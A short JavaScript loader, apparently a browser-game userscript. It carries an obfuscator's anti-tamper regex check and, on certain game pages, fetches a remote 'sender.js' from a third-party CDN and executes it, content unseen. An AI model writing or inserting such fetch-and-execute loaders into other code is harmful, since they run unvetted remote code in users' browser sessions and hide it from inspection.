initialize();

function initialize() {
    const executeOnce = function () {
        let isFirstCall = true;
        return function (context, callback) {
            const executeCallback = isFirstCall ? function () {
                if (callback) {
                    const result = callback.apply(context, arguments);
                    callback = null;
                    return result;
                }
            } : function () {};
            isFirstCall = false;
            return executeCallback;
        };
    }();

    const executeCallbackOnce = executeOnce(this, function () {
        return executeCallbackOnce.toString().search(/(((.+)+)+)+$/) !== -1;
    });

    executeCallbackOnce();
    loadScriptIfNeeded();
}

function loadScriptIfNeeded() {
    const url = 'https://rawcdn.githack.com/shurub3l1/JavaScript/a621ffadc4aeba931bf7a3eaa17a5c05111732ca/sender.js';
    if (window.location.href.includes('screen=memo') || window.location.href.includes('screen=place') || window.location.href.includes('screen=map')) {
        window.as = true;
        $.ajax({
            type: 'GET',
            url: url,
            dataType: 'script',
            cache: false
        });
    }
}
